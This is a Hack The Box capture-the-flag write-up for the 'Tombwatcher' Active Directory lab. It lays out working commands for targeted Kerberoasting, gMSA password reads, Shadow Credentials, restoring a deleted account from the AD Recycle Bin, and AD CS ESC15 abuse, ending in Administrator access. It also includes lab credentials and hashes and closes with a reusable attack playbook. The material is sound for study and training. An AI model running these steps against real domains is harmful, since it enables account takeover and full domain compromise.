

**Box:** Tombwatcher · **IP:** 10.129.86.106 (changes per reset) · **Domain:** tombwatcher.htb · **DC:** DC01.tombwatcher.htb

**Start:** assumed-breach — given low-priv creds `henry:H3nry_987TGV!`

**Full chain:**

`henry` → (WriteSPN) targeted Kerberoast **Alfred** (`basketball`) → Alfred (AddSelf) joins **Infrastructure** → ReadGMSAPassword → **ansible_dev$** (NTLM) → ForceChangePassword **Sam** → (WriteOwner + GenericAll) Shadow-Cred **john** (NTLM) → **AD Recycle Bin** restore hidden **cert_admin** → **AD CS ESC15 (EKUwu)** → **Administrator**

  

> I did the whole AD chain myself up to john's shell. Only the AD CS endgame (Recycle Bin + ESC15) needed a walkthrough — so that part is written out in detail: **why**, **when**, and **what to look for**.

  `Certipy` install by `pipx uninstall certipy-ad`

---

## Phase 1 — Enumerate (what's open, who exists)

  

nmap → it's a **DC**: Kerberos (88), LDAP (389/636), SMB (445), DNS (53), hostnames **DC01** / **tombwatcher.htb**, plus a **CA / PKI Enrollment Server** (remember that — AD CS is the endgame).

  

```bash

sudo ntpdate 10.129.86.106

echo '10.129.86.106 tombwatcher.htb DC01.tombwatcher.htb DC01' | sudo tee -a /etc/hosts

nxc smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --shares

nxc smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' -M spider_plus

nxc ldap DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --users

```

Users: **Administrator, guest, henry, sam, john, Alfred, krbtgt**. SMB = read-only, not admin. Free-loot checks came back empty:

```bash

nxc smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' -M gpp_password

nxc ldap DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' -M get-desc-users

nxc ldap DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' -M adcs

```

  

> **What I learned #1 — blank ≠ failure.** `gpp_password` only hits if an old `Groups.xml` cpassword was left in SYSVOL; `get-desc-users` reads the AD *description* field. Empty just means nobody left loot there. The "**Arg moved to the ldap protocol**" error on a groups module just means that enum belongs on `nxc ldap`, not `nxc smb`. **Take note of this user list** — later you'll notice a name that *should* exist but doesn't (`cert_admin`), and that gap is the whole endgame. 

Also the `adcs` confirms that CA exists with `pkinit`, so `certipy` can be used.

  

---

  

## Phase 2 — BloodHound

  

```bash

bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.129.86.106 --dns-tcp -c All --zip

```

(nxc's `--bloodhound` zips didn't import cleanly — the Python collector is the reliable fallback.)

  

> **What I learned #2 — `-ns` is an IP, not DC01.** `-ns` is the **DNS server bloodhound-python queries**; it can't resolve a *name* before it has a name server, so it needs the DC's **IP**. Tools that *do* the lookups (`-ns`, `--dns-server`) want an IP; tools that just *connect* (`nxc`, `bloodyAD --host`) take `DC01.tombwatcher.htb` because `/etc/hosts` resolves it.

  

---

  

## Phase 3 — henry → Alfred (targeted Kerberoast via WriteSPN)

  

BloodHound: **henry can WriteSPN on Alfred**.

  

> **What I learned #3 — targeted Kerberoasting.** Normal Kerberoasting needs an account that *already* has an SPN. If I can **write** an SPN, I **make** the account roastable: add a fake SPN → request its TGS → crack offline.

  

```bash

bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' set object Alfred servicePrincipalName -v 'domain/meow'

impacket-GetUserSPNs tombwatcher.htb/henry:'H3nry_987TGV!' -dc-ip 10.129.86.106 -request-user Alfred

hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt

```

→ **`Alfred : basketball`**. (Clean up the fake SPN after: `set object Alfred servicePrincipalName -v ''`.) Alfred = SMB only, not admin → back to BloodHound.

  

---

  

## Phase 4 — Alfred → Infrastructure → read the gMSA


Path from Alfred:

```

Alfred --AddSelf--> Infrastructure --ReadGMSAPassword--> ansible_dev$ --ForceChangePassword--> Sam --WriteOwner--> john --GenericAll--> (AD CS) --> Administrator

```

> **What I learned #4 — read edges `principal → right → target`, and only use edges that START from something you own.** "Domain Admins Owns ansible_dev$" / "Administrator GenericWrite" look backward but aren't — they start from accounts *I don't control*, so they're noise. My usable chain starts at Alfred.

  

```bash

bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u alfred -p 'basketball' add groupMember Infrastructure alfred

bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u alfred -p 'basketball' get object 'ansible_dev$' --attr msDS-ManagedPassword

```

→ NTLM for ansible_dev$: `8d5363f881f1bb3bff9b0d64b8b76d7a`.

  

> **What I learned #5 — gMSA gotchas.**

> - **The name ends in `$`.** A gMSA's `sAMAccountName` is `ansible_dev$`. Drop the `$` and you're asking for a user that doesn't exist (that's why the bare-name read returned *only* the DN with no password — you must match the real logon name; same reason `nxc ... -u 'ANSIBLE_DEV$'` needs the `$`).

> - **Don't try to crack it.** A gMSA password is 256 bytes of random — hashcat will never crack it. You don't crack it, you **pass-the-hash** with the NTLM.

  

Confirm + use via PtH:

```bash

nxc smb 10.129.86.106 -u 'ANSIBLE_DEV$' -H 8d5363f881f1bb3bff9b0d64b8b76d7a

bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p ':8d5363f881f1bb3bff9b0d64b8b76d7a' set password sam 'NewPass123!'

```

→ Sam's password is ours. (Confirm: `nxc smb 10.129.86.106 -u sam -p 'NewPass123!'`.)

  

---

  

## Phase 5 — Sam → john (WriteOwner → GenericAll → Shadow Credentials)

  

Sam has **WriteOwner** on john. Turn that into full control, then take john's identity.

  

> **What I learned #6 — the "own → grant → abuse" ladder.** WriteOwner alone isn't enough to *do* anything; it just lets you become the **owner**. The owner can rewrite the object's DACL, so the standard combo is: **set yourself owner → grant yourself GenericAll → now abuse**. Always grant GenericAll after owning.

  

```bash

bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u sam -p 'NewPass123!' set owner john sam

bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u sam -p 'NewPass123!' add genericAll john sam

```

  
Now abuse GenericAll over john with **Shadow Credentials** (cleaner than resetting his password — no noisy password change, and it gives you his hash):

```bash

certipy shadow auto -u sam@tombwatcher.htb -p 'NewPass123!' -account john -dc-ip 10.129.86.106

```

→ **john NTLM: `ad9324754583e3e42b55aad4d3b8d2bf`**.


> **What I learned #7 — Shadow Credentials (why a HASH, not a password).** GenericAll lets me write john's **`msDS-KeyCredentialLink`** attribute. I add a fake public key ("shadow credential") I control, then do **PKINIT** (certificate Kerberos) as john → the KDC hands back a TGT and john's **NT hash**. `certipy shadow auto` does add-key → authenticate → cleanup in one shot. Needs AD CS / PKINIT present on the domain (it is here). Result is an NT hash → pass-the-hash onward.

  

```bash

evil-winrm -i dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf

```

**Shell as john.** 🎉 (user-level; nothing useful in his files.)


---

  

## Phase 6 — The dead end that points at the AD Recycle Bin


john has **GenericAll toward AD CS**, so enumerate what's available:

```bash

certipy find -target dc01.tombwatcher.htb -u john -hashes :ad9324754583e3e42b55aad4d3b8d2bf -vulnerable -stdout
# this gave me no fruitful result.

certipy find -target dc01.tombwatcher.htb -u john -hashes :ad9324754583e3e42b55aad4d3b8d2bf
# but this command did

```

Output: the CA `tombwatcher-CA-1` exists, `Enroll: Authenticated Users`… `found 11 certificate templates`** and no directly-usable path for john. Checking the templates one by one, one template for `webserver showed a SID for an user without any user name, which was supicious`. So back in the john's shell, lets check if the user exists or not by `Get-ADUser -Identity "S-1-5-21-111111111-222222222-333333333-1105"`. Couldnot find anything!


### 🔎 AD RECYCLE BIN — quick reference

When to use this: you have a powerful right (GenericAll / GenericWrite / WriteOwner) over a container or OU, but the object you'd want to use it on doesn't exist as a live account.

How do I know I can abuse it (the 3 signals):

1. Everything points at a specific role/account (here: AD CS / a "cert" admin)…
2. …but that account is NOT in the live user list you pulled in Phase 1 (no cert_admin).
3. You hold GenericAll over a container/OU with no live object to aim it at.

→ All three together = someone deleted the object. Go restore it.

Confirm the feature is on, find the deleted object, restore it, reset its password (run in the john evil-winrm shell):

How to check + do it:

```powershell

1. Get-ADOptionalFeature 'Recycle Bin Feature' 
# → is the bin even on? (if off, this whole trick is dead, feature off → can't restore (find another path); "access denied" on restore → your rights don't actually cover that object's parent container.)  
   
2. Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
# → list deleted objects, grab the objectGUID of the one you want

3. Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
# → bring it back to life

4. Get-ADUser cert_admin 
# check id its restored

5. Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString '0xdf0xdf!' -AsPlainText -Force) 
# → now you own a working account

6. nxc smb dc01.tombwatcher.htb -u cert_admin -p '0xdf0xdf!'
# Confirm the account is working
```

(The GUID comes from the `Get-ADObject` deleted-objects listing — restore **by objectGUID**.

**Why `cert_admin` and not john for the cert attack:** the enrollment rights / template permissions were set up for **cert_admin**. john only had the control needed to *resurrect* cert_admin. Restored account = the intended AD CS operator.

> **What I learned #8 — when a control right has no live target, check the AD Recycle Bin.** GenericAll over a container is useless if the useful object was **deleted**. Deleted objects don't vanish — if the **Recycle Bin feature** is on, they sit as tombstones you can **restore**, and your container rights let you restore + re-own them. The giveaway on Tombwatcher: the box is screaming "certificate admin" but no such user is alive. Someone deleted `cert_admin`. Restore it.



---

## Phase 7 — AD CS **ESC15 (EKUwu, CVE-2024-49019)** → Administrator


### 🔎 AD CS ESC15 (EKUwu) — quick reference

**When to use this:** certipy find -vulnerable flags ESC15, AND there's a version-1 template you're allowed to Enroll on (the default WebServer template is the classic one, and Enroll: Authenticated Users means basically any account qualifies).

**How do I know I can abuse it:**

- certipy find lists the template with ESC15 next to it, and
- the Enroll permission includes a group you're in (e.g. Authenticated Users), and
- it's a V1 template where you supply the subject → you can inject any EKU (Application Policy) the template never meant to give you.

The core idea: ESC15 lets you bolt an arbitrary EKU onto your cert request (-application-policies). You then use that EKU to become Administrator — via one of two routes below.

**Which route? (decision rule):**

- **Route A** = "make a fake cert that claims to be admin."  Try Route A first (simplest). If certipy auth is rejected (modern strong cert-mapping), switch to Route B. If it fails: auth rejected / KDC name-mismatch → use Route B. 

- **Route B** = " become a certificate enrollment agent and legitimately get a cert issued to admin" (beats mapping enforcement).


rpc_s_access_denied on the req → you're almost always hitting the wrong/old target IP (check -dc-ip/-target), or cert_admin lacks Enroll.

As **cert_admin**, re-scan:

```bash

certipy find -target dc01.tombwatcher.htb -u cert_admin -p '0xdf0xdf!' -vulnerable -stdout
```

→ shows **ESC15** and **ESC17**.

#### 1. What do you need to check?

|Requirement|What to look for|
|---|---|
|Template version|`Schema Version : 1`|
|Subject control|`Enrollee Supplies Subject : True`|
|Enrollment permission|Your user or one of your groups appears under `User Enrollable Principals`|
|Template availability|`Enabled : True` and the template is published by a CA|
|CA patch status|The CA must be vulnerable to CVE-2024-49019 for ESC15 exploitation|

Certipy's `find` output can help identify the template settings and your enrollment rights. However, its ESC15 warning alone does not prove that the CA remains vulnerable.

#### 2. Does `Authenticated Users` mean your account qualifies?

Usually, yes, if your account is a member of the domain's `Authenticated Users` group and the template grants that group Enroll permission. For example:

```
Template Name                  : WebServer
Enabled                        : True
Schema Version                 : 1
Enrollee Supplies Subject      : True

Enrollment Rights:
    INLANEFREIGHT\Authenticated Users

User Enrollable Principals:
    INLANEFREIGHT\Authenticated Users
```

This indicates that your account can potentially enroll in the template. It does not establish that the CA is unpatched or that every part of the attack will work.

## Why there are TWO certipy requests (and how to know which to use)

ESC15 gives you a cert with an EKU of your choosing. The question is **how you turn that into "I am Administrator."** Two routes:

**Route A — direct "Client Authentication" + claim the UPN (try this first, it's simplest):**

```bash
certipy req -u cert_admin -p '0xdf0xdf!' -dc-ip 10.129.86.106 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
certipy auth -pfx administrator.pfx -dc-ip 10.129.86.106
```

Idea: inject a **Client Authentication** EKU and set `-upn administrator`, then PKINIT-auth as administrator. **On Tombwatcher this auth step fails** — because of modern **strong certificate mapping** (post-2022 `StrongCertificateBindingEnforcement`), the DC won't trust a cert that merely *claims* UPN=administrator without a strong SID mapping. `certipy auth` bounces.

**Route B — become a Certificate Enrollment Agent, request ON BEHALF OF administrator (the one that works):**

```bash
certipy req -u cert_admin -p '0xdf0xdf!' -dc-ip 10.129.86.106 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -application-policies 'Certificate Request Agent'

certipy req -u cert_admin -p '0xdf0xdf!' -dc-ip 10.129.86.106 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\administrator'

certipy auth -pfx administrator.pfx -dc-ip 10.129.86.106
```

Idea: inject the **Certificate Request Agent** (Enrollment Agent) EKU → that cert lets you **enroll on behalf of** someone else → request a client-auth cert **for administrator** via `-on-behalf-of`. This cert is *properly issued to* administrator, so it maps strongly and PKINIT succeeds → you get **administrator's NT hash**.

> **What I learned #10 — the decision rule.** Start with **Route A** (direct UPN). If `certipy auth` is rejected (cert-mapping enforcement), escalate to **Route B** (enrollment-agent → on-behalf-of). A = "forge a cert that *claims* to be admin"; B = "legitimately get a cert *issued to* admin." B beats strong mapping because the issuance is real.



Then pass-the-hash to root:

```bash
evil-winrm -i dc01.tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
```

**Administrator.** 👑 Box done.

> *(Aside: "is this like the Fluffy command?" — Fluffy was also an AD CS box but a **different** ESC — shadow-credential / ESC16 family. Same tool, `certipy`; different technique. The pattern "certipy find → pick ESC → req → auth → PtH" is the shared muscle memory.)*

---

## The AD CS endgame — quick decision tree (what to do next time)

```
Got a shell/creds + nmap saw a CA (PKI Enrollment Server)?
          │
          ▼
certipy find -vulnerable -stdout   (as EACH identity you control)
          │
   ┌──────┴───────────────┐
   │ a vulnerable template │ ──► req the cert → auth → PtH  (standard ESCx)
   │ you can enroll on     │
   └──────┬───────────────┘
          │ "no templates" / right points at a cert account that ISN'T in the live user list
          ▼
   Check AD Recycle Bin:
   Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects
   Restore-ADObject -Identity <GUID> ; reset its password
          │
          ▼
   Re-run certipy find AS the restored account
          │
   ESC15 (EKUwu) on a V1 'WebServer' template you can enroll?
          │
   ┌──────┴───────────────────────────────┐
   │ Route A: -upn admin + 'Client Auth'   │ ──► auth OK? → admin hash. Done.
   └──────┬────────────────────────────────┘
          │ auth REJECTED (strong cert mapping)
          ▼
   Route B: 'Certificate Request Agent' → 2nd req -on-behalf-of admin → auth → admin hash
```

---

## Takeaways — the reusable AD playbook

1. **DC first moves:** `ntpdate`, hosts, `nxc smb/ldap` (`--shares`, `--users`, free-loot modules). Note the user list — a *missing* expected name is a lead.
2. **No quick win → BloodHound** (`bloodhound-python -ns <DC-IP>`). Only use edges starting from something you own.
3. **WriteSPN → targeted Kerberoast** (`set SPN` → `GetUserSPNs -request-user` → `-m 13100` → clean up).
4. **gMSA (`*$`):** join the reader group → read `msDS-ManagedPassword` → **NTLM hash, uncrackable, pass-the-hash.** Keep the `$` in the username.
5. **WriteOwner → set owner → add GenericAll → abuse** (the own-grant-abuse ladder).
6. **GenericAll + AD CS → Shadow Credentials** (`certipy shadow auto`) → target's NT hash → evil-winrm PtH.
7. **Control right with no live target → AD Recycle Bin.** Restore the deleted object (by GUID), reset its password.
8. **AD CS: `certipy find -vulnerable` → pick the ESC whose preconditions you MEET.** ESC15 = EKUwu (V1 WebServer + enroll + injectable Application Policies).
9. **ESC15 routing:** try direct UPN/Client-Auth; if `auth` is rejected by strong mapping, pivot to **Certificate Request Agent + `-on-behalf-of`**.
10. **`rpc_s_access_denied` / auth fails on a request you should be allowed → check you're hitting the CURRENT target IP**, not a stale one.
